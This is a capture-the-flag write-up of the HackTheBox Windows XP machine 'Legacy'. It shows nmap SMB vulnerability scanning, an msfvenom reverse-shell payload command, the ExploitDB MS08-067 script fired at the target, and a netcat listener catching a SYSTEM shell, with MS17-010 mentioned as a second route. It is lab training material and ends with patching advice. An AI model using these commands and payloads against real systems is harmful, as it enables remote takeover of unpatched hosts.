---
toc: true
comments: true
title: HackTheBox - Legacy
layout: post
title: HackTheBox - Legacy
date: 2024-05-28 18:28 -0300
categories: [HackTheBox, Easy, CTF]
tags: [Windows, SMB, MS08-067, MS17-010, msfvenom, RCE]    
image: /assets/Posts/Legacy/logo.png
---

## Pre
- After rooting [Lame](/posts/hackthebox-lame/), the natural pairing is Legacy: same "day one on HTB" energy, but on the Windows side of the fence.
- Legacy is a Windows XP box, which means we get to play with the two most iconic SMB remote-code-execution bugs in history: **MS08-067** and **MS17-010** (EternalBlue). Both work here.
- On the [Blue](/posts/tryhackme-blue/) room I fired EternalBlue through Metasploit and let it do everything. This time I wanted to go the other way and drive **MS08-067 by hand** with a public exploit and my own shellcode, so the two writeups complement each other instead of repeating the same button-press.

## Phase 1: Recon
The usual two-step nmap. Fast port sweep first:

```shell
$ nmap -Pn -n -p- --min-rate 10000 --open -vv -oN nmap/firstScan $IP
PORT    STATE SERVICE      REASON
139/tcp open  netbios-ssn  syn-ack
445/tcp open  microsoft-ds syn-ack
```

Only SMB is exposed – no web, no RDP, nothing else to distract us. That already narrows the whole box down to "find the SMB bug". Let's version it:

```shell
$ nmap -Pn -n -p 139,445 -T4 -sSCV -A -oN nmap/versions $IP

PORT    STATE SERVICE      VERSION
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds

Host script results:
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2024-05-28T21:03:00+03:00
|_clock-skew: mean: 5d00h27m38s
```

**Windows XP.** In 2024. That is basically a museum piece, and museum pieces from the XP era have a very predictable weak spot. Let's not guess – let's ask nmap directly with the `vuln` scripts, exactly like we did before hitting EternalBlue on Blue.

```shell
$ nmap -Pn -n -p 139,445 --script smb-vuln* -oN nmap/smbVuln $IP
PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|_          
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|_          
```

Two critical RCEs, both marked **VULNERABLE**. Either one lands us a SYSTEM shell. Since Blue already covered the MS17-010/EternalBlue-through-Metasploit route, let's take the other door and do **MS08-067** the manual way.

## Phase 2: MS08-067 by hand
MS08-067 is a bug in the `NetAPI32` / Server service that mishandles a crafted RPC request over SMB, letting us overflow a buffer and execute code. Because the Server service runs as **NT AUTHORITY\SYSTEM**, successful exploitation drops us straight at the top – no privilege escalation phase required, just like Samba handed us root on Lame.

We'll grab a well-known public PoC. There are several floating around; the one I like is the reworked ExploitDB script that lets you paste in your own shellcode and pick the target OS.

```shell
$ searchsploit ms08-067
--------------------------------------------------------- ---------------------------------
 Exploit Title                                           |  Path
--------------------------------------------------------- ---------------------------------
Microsoft Windows Server - Code Execution (MS08-067)     | windows/remote/40279.py
--------------------------------------------------------- ---------------------------------

$ searchsploit -m windows/remote/40279.py
```

The script ships with a placeholder shellcode. We swap it for our own so we control what we catch. `msfvenom` is just a payload generator here – it's the standard way to produce clean shellcode, so using it doesn't make this a "Metasploit exploit". We ask for a raw reverse shell in Python format and, importantly, tell it to avoid the bad characters that break the SMB/RPC path:

```shell
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.7 LPORT=443 \
    EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" \
    -f python -v shellcode -a x86 --platform windows
```

A few things worth understanding about that command:

- `windows/shell_reverse_tcp` is a plain reverse shell, so we can catch it with netcat – no meterpreter handler needed.
- `-b "..."` is the bad-char list. Null bytes and characters like `\` and `/` get mangled by the vulnerable string handling, so we exclude them or the exploit fails silently.
- `EXITFUNC=thread` makes the payload exit cleanly without crashing the (already fragile) service, which matters because Windows XP services love to fall over.

We paste the generated `shellcode` blob into the script's shellcode variable, then start a listener:

```shell
$ nc -lvnp 443
```

And fire the exploit. The second argument is the **target index** – for this PoC, `6` maps to *Windows XP SP3 English*, which is what our `smb-os-discovery` hinted at. Port `445` is the SMB entry point:

```shell
$ python2 40279.py 10.10.10.4 6 445
[-] Sending exploit to 10.10.10.4...
[-] Payload sent, check your listener.
```

Over on the listener we catch a shell, and a quick `whoami` confirms we did not have to escalate anything:

```shell
$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.4] 1035
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32> whoami
whoami
nt authority\system
```

We are in, and we are SYSTEM. 😎

> If the exploit fails with the right target index, it usually means the service already crashed from a previous attempt. On real XP boxes MS08-067 can be a one-shot deal – if it dies you often have to reset the machine before the Server service comes back. Patience beats hammering it.
{: .prompt-warning }

## Phase 3: Loot
With a SYSTEM shell, both flags are trivial. XP keeps things in the classic locations:

```shell
C:\WINDOWS\system32> type C:\Documents and Settings\john\Desktop\user.txt
C:\WINDOWS\system32> type C:\Documents and Settings\Administrator\Desktop\root.txt
```

### The MS17-010 alternative
For the sake of showing the second door: MS17-010 (EternalBlue) also works on Legacy. If you want the manual version instead of the Metasploit run I did on Blue, the [helviojunior / worawit](https://github.com/worawit/MS17-010) scripts (`checker.py` + `send_and_execute.py`) let you feed the same kind of `msfvenom` payload straight into the SMBv1 flaw. Same outcome – a SYSTEM shell – through a different bug, which is a nice way to see that "the box was patched against one thing but not the other" is exactly the situation you hunt for in the real world.

## Conclusions
- Legacy and Lame are the matched Windows/Linux pair everyone should start HTB with, and doing them back to back makes the parallels obvious: enumerate a single old service, identify the CVE, and let a root/SYSTEM-level service do the privilege work for you.
- Doing MS08-067 by hand (public PoC + your own `msfvenom` shellcode + a netcat catch) demystifies what Metasploit does under the hood on [Blue](/posts/tryhackme-blue/). Bad chars, target indexes and `EXITFUNC` stop being magic once you set them yourself.
- The defensive takeaway writes itself: this is a 16-year-old unpatched OS reachable over SMB. Patch management and killing SMBv1 would have closed both doors instantly.

_Keep hacking_  🙈🙉🙊
